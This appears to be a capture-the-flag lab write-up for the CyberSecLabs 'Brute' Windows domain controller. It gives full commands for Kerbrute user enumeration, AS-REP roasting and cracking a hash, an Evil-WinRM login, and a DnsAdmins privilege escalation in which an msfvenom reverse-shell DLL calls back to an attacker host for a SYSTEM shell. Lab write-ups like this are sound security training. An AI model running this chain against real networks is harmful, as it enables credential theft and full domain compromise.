---
description: https://www.cyberseclabs.co.uk/labs/info/Brute/
---

# Brute

![](<../../../.gitbook/assets/image (564) (1).png>)

## Nmap

On this machine I will initiate a SYN scan and define version checking with default scripts.

```aspnet
sudo nmap 172.31.3.3 -sS -p- -sV -sC

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-12-15 19:00:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: brute.csl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: brute.csl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BRUTE
|   NetBIOS_Domain_Name: BRUTE
|   NetBIOS_Computer_Name: BRUTE-DC
|   DNS_Domain_Name: brute.csl
|   DNS_Computer_Name: Brute-DC.brute.csl
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-15T19:01:50+00:00
| ssl-cert: Subject: commonName=Brute-DC.brute.csl
| Not valid before: 2020-12-14T18:52:18
|_Not valid after:  2021-06-15T18:52:18
|_ssl-date: 2020-12-15T19:01:58+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49729/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BRUTE-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: BRUTE-DC, NetBIOS user: <unknown>, NetBIOS MAC: 02:e7:d2:15:e3:46 (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-12-15T19:01:50
|_  start_date: N/A
```

## SMB

As per usual I like to start with quick null authentication checks against SMB. Unfortunately we have nothing to reveal here.

![](<../../../.gitbook/assets/image (565).png>)

## Kerberos

As port 88 is open we can run `Kerbrute` against the server to hopefully identify any valid usernames.

```aspnet
kerbrute userenum /usr/share/seclists/Usernames/Names/names.txt -d brute.csl --dc 172.31.3.3
```

![](<../../../.gitbook/assets/image (566).png>)

As above we have discovered four usernames. We can store these in a test file and perform AS-REP roasting with them which I have covered in a little more detail below:

{% embed url="https://app.gitbook.com/@akimboviper/s/tools/impacket/as-rep-roasting" %}

As we have no web server or SMB access the next best logical step is to check for Kerberoastable accounts.

```aspnet
sudo python2 GetNPUsers.py brute/ -usersfile /home/kali/brute/users.txt -dc-ip 172.31.3.3 -format john -outputfile /home/kali/brute/hash.txt
```

![](<../../../.gitbook/assets/image (568).png>)

We notice that from the resulting output that the user 'tess' has not returned an error message. We can `cat` the output file to confirm if we have a hash.

![](<../../../.gitbook/assets/image (569).png>)

We can send this straight to John and attempt to crack.

```aspnet
sudo john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/brute/hash.txt 
```

![](<../../../.gitbook/assets/image (570).png>)

We now have the credentials: `tess:Unique1`

## Initial Foothold

I checked these credentials against SMB and had access to list shares. The shares SYSVOL and NETLOGON had nothing interesting in them. We do have WinRM running so we can use `Evil-WinRM` and attempt to connect.

```aspnet
evil-winrm -u tess -p Unique1 -i 172.31.3.3 -s /home/kali/scripts/windows/
```

![](<../../../.gitbook/assets/image (571).png>)

## Privilege Escalation

I like to check the `systeminfo` command first when looking for privilege escalation but, in this instance access to the command was denied. I next looked at `whoami /all` to have a quick overview on account memberships and permissions.

![](<../../../.gitbook/assets/image (572).png>)

What stands out immediately is that we are a member of the 'DnsAdmins' group. I am aware of a privilege escalation method which can be performed by users that are part of the 'DnsAdmins' group.

A quick google search for this returns a really good medium article on performing this attack.

{% embed url="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2" %}

As per the article we first need to create a malicious DLL file with `msfvenom`.

```aspnet
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.0.176 LPORT=1234 -f dll > /home/kali/scripts/windows/privesc.dll
```

The article actually recommends hosting the DLL file on a SMB server form our attacking machine. This did not work for me as the connection back to the file kept getting terminated early.

![](<../../../.gitbook/assets/image (574).png>)

Instead I opted to upload the file directly with Evil-WinRM just make sure when connecting with Evil-WinRM you define the location of the payload with the `-s` switch. Once connected to the `upload` command and then specify the file.

![](<../../../.gitbook/assets/image (575).png>)

After the upload has completed run the following command.

```aspnet
dnscmd brute-dc /config /serverlevelplugindll C:\Users\Tess\Documents\privesc.dll
```

The command should return back completed. Now start up a `netcat` listener on your attacking machine and specify the same port as used in `msfvenom` for the payload.

```aspnet
nc -lvp 1234
```

Next we can query the DNS service on the server to view its status. Then run the following commands:

```aspnet
sc.exe query dns
sc.exe \\brute-dc stop dns
sc.exe \\brute-dc start dns
```

![](<../../../.gitbook/assets/image (576).png>)

The netcat shell should get a callback and we should have gained access as SYSTEM.

![v](<../../../.gitbook/assets/image (577).png>)
